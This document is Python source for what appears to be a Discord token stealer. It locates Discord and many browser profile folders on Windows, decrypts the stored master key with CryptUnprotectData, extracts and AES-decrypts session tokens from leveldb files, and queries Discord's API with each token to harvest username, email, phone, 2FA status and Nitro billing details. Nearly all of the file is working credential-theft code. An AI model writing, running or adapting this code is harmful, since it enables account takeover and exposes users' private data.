from __future__ import annotations
import os
from base64 import b64decode
from win32crypt import CryptUnprotectData
import datetime
from os import listdir
from json import loads
from Crypto.Cipher import AES
from typing import Any
from re import findall
from requests import get
from PyInfosFinder.__init__ import local, roaming

userPath = os.path.expanduser("~")
tokens = []
cleaned = []
checker = []

def get_tokens() -> list[Any]:
    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(
                buff[15:])[:-16].decode()
        except:
            return 'Error'
    
    def find_tokens():
        goodTokens = []
        chrome = local + '\\Google\\Chrome\\User Data'
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
        }
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            try:
                with open(path + f'\\Local State', 'r') as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
            except:
                continue

            for file in listdir(path + f'\\Local Storage\\leveldb\\'):
                if not (file.endswith('.ldb') or file.endswith('.log')):
                    continue
                try:
                    with open(path + f'\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue

            for i in tokens:
                if i.endswith('\\'):
                    i.replace('\\', '')
                elif i not in cleaned:
                    cleaned.append(i)

            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    if tok not in goodTokens:
                        goodTokens.append(tok)
                except IndexError:
                    continue

        return goodTokens
    return find_tokens()

def process_token(token: str) -> dict[str, Any] | None:
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        res = get('https://discord.com/api/v9/users/@me', headers=headers)
        if res.status_code == 200:
            res_json = res.json()
            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json['id']
            email = res_json.get('email', None)
            phone = res_json.get('phone', None)
            mfa_enabled = res_json['mfa_enabled']
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{res_json['avatar']}.png" if res_json.get('avatar') else None
            flags = res_json.get('public_flags', 0)
            badges = []
            
            if flags & 1:
                badges.append("Staff")
            if flags & 2:
                badges.append("Partner")
            if flags & 4:
                badges.append("Hypesquad")
            if flags & 8:
                badges.append("Bug Hunter")
            if flags & 64:
                badges.append("Early Supporter")

            nitro_data_res = get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers)
            nitro_data = nitro_data_res.json()
            nitro_details = {}

            if nitro_data:
                has_nitro = True
                nitro_details = {
                    "type": nitro_data[0]["plan_type"],  # Nitro type (e.g., "Nitro", "Nitro Classic")
                    "premium_since": nitro_data[0]["current_period_start"].split('.')[0]
                }
                end_date = nitro_data[0]["current_period_end"].split('.')[0]
                d1 = datetime.datetime.strptime(end_date, "%Y-%m-%dT%H:%M:%S")
                days_left = (d1 - datetime.datetime.now()).days
                nitro_details["days_left"] = days_left
            else:
                has_nitro = False

            infos = {
                "username": user_name,
                "userid": user_id,
                "email": email,
                "phone": phone,
                "twofa": mfa_enabled,
                "avatar_url": avatar_url,
                "badges": badges,
                "hasnitro": has_nitro,
                "nitro_details": nitro_details
            }

            return infos

    except Exception as e:
        return None
    
    return None

def get_common_infos(tokens: list[str]):
    if len(tokens) < 1:
        return

    if len(tokens) == 1:
        infos = process_token(tokens[0])
    else:
        infos_dict = {}
        already_checked = set()

        for token in tokens:
            if token not in already_checked:
                already_checked.add(token)
                infos = process_token(token)
                infos_dict[token] = infos
            
        return infos_dict